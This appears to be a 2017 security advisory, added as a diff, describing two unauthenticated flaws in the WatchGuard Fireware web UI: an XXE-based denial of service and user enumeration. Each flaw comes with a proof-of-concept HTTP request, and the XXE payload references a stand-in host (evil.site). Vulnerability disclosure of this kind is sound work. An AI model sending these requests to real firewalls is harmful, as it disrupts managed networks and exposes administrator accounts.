@@ -1,0 +1,146 @@
+id: 27610
+date: 04/17/2017
+title: Watchguard Firebox / XTM XXE Injection Vulnerability
+author: David Fernandez
+cves: 
+
+Watchguardas Firebox and XTM are a series of enterprise grade network
+security appliances providing advanced security services like next
+generation firewall, intrusion prevention, malware detection and
+blockage and others. Two vulnerabilities were discovered affecting the
+XML-RPC interface of the Web UI used to manage Fireware, the operating
+system running on Watchguard Firebox and XTM appliances. To exploit
+any of the flaws discovered, no authentication on the Web UI is
+needed.
+---------------------------------------------------------------------------
+---------------------------------------------------------------------------
+XML-RPC External Entity Expansion DoS
+
+Credit
+David Fernandez of Sidertia Solutions
+
+Versions Affected
+Fireware v11.9 version was found to be vulnerable and vendor confirmed
+v11.12 Update 1 (latest when we reported to vendor) was vulnerable as
+well.
+
+CVE Reference
+As far as we know, no CVE has been requested for this vulnerability.
+Vendor assigned internal id 92867 to vulnerability and will release a
+knowledge Base article following this advisory.
+
+Vendor Fix
+Vendor fixed the vulnerability in their v11.12.2 release.
+
+Vulnerability Type
+Denial of service.
+
+Description
+While attempting to abuse the XML parser of the interface by mean of
+External Entity Expansion (XXE) attacks, we discovered that after
+repetitive attempts the XML-RPC agent crashes causing a severe
+disruption in the functionality and performance of the device.
+
+Impact
+On Fireware version v11.9, after a discrete number of injection
+attempts, the XML-RPC agent (wgagent) crashes and is not able to
+recover, causing a lockout in the Web UI which will be unavailable for
+ten minutes, thus making impossible to manage the firewall. Besides
+that, it causes either service interrupt or a serious degradation in
+performance in connections traversing the firewall (for example, RDP
+clients were unable to connect or did it in slow connection mode). On
+Fireware version v11.12 Update 1, the agent recovers correctly after
+each crash, although by continuously executing the XXE attacks the
+negative effects on the device are the same than the ones observed in
+v11.9.
+
+Proof of concept
+Below is an example of one of the requests that, after several
+attempts, causes a crash in the XML-RPC agent:
+
+POST /agent/login HTTP/1.1
+Host: fireware-host:4100
+Connection: close
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36
+(KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Encoding: gzip, deflate, sdch, br
+Accept-Language: es,en;q=0.8,ca;q=0.6
+Cookie: sessionid=dasdasdas
+Content-Length: 268
+Content-Type: application/xml
+
+<?xml version="1.0"?>
+<!DOCTYPE methodCall [
+<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/
+resource=https://evil.site/index.php?content=testXXE"> ]>
+<methodCall><methodName>login</methodName><params><param><value><struct><member><name>password</name><value><string>&xxe;</string></value></member><member><name>user</name><value><string>admin</string></value></member></struct></value></param></params></methodCall>
+
+Links
+https://www.sidertia.com/Home/Community/Blog/2017/04/17/Fixed-the-Fireware-Vulnerabilities-discovered-by-Sidertia
+---------------------------------------------------------------------------
+---------------------------------------------------------------------------
+XML-RPC User Enumeration
+
+Credit
+David Fernandez of Sidertia Solutions
+
+Versions Affected
+Fireware v11.9 version was found to be vulnerable and vendor confirmed
+v11.12 Update 1 (latest when we reported to vendor) was vulnerable as
+well.
+
+CVE Reference
+As far as we know, no CVE has been requested for this vulnerability.
+Vendor assigned internal id 92884 to vulnerability and will release a
+knowledge base article following this advisory.
+
+Vendor Fix
+Vendor fixed the vulnerability in their v11.12.1 release.
+
+Vulnerability Type
+Information disclosure
+
+Description
+When a login attempt is made directly over the login endpoint of the
+XML-RPC interface using a blank password, we discovered the response
+from the device was different for valid users in Web UI than for
+non-existing ones.
+
+Impact
+The flaw allows to enumerate existing users in the management
+interface of the device. The Web UI allows to use as user repository
+an internal database (Firebox-DB), Active Directory or a Radius
+server, although this flaw was only tested authenticating against
+Firebox-DB.
+
+Proof of concept
+Below is a request for an existing user login attempt with blank
+password in Firebox-DB:
+
+POST /login HTTP/1.1
+Host: fireware-host:4100
+Connection: close
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36
+(KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Encoding: gzip, deflate, sdch, br
+Accept-Language: es,en;q=0.8,ca;q=0.6
+Cookie: sessionid=dasdasdas
+Content-Length: 268
+Content-Type: application/xml
+
+<methodCall><methodName>login</methodName><params><param><value><struct><member><name>password</name><value><string></string></value></member><member><name>user</name><value><string>admin</string></value></member></struct></value></param></params></methodCall>
+
+Which will answer with a 200 OK with no body content for an existing
+user and with a 200 OK with an XML message (Invalid Credentials) in
+case it does not.
+
+Links
+https://www.sidertia.com/Home/Community/Blog/2017/04/17/Fixed-the-Fireware-Vulnerabilities-discovered-by-Sidertia
+
+#  0day.today [2023-03-24]  #
